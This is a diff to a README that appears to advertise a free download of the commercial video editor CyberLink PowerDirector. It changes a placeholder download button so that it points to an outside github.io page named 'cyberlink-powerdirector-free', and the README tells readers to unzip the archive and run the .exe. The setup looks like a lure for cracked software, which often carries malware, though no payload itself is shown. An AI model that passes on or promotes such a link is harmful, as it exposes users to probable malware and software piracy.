@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://cyberlink-powerdirector-free.github.io/.github/)
 
 ## 📸 Overview
 ![powerdirector-main-interface](https://github.com/user-attachments/assets/a89c3f80-e699-42e1-93ff-6bc9c7fd9cf9)
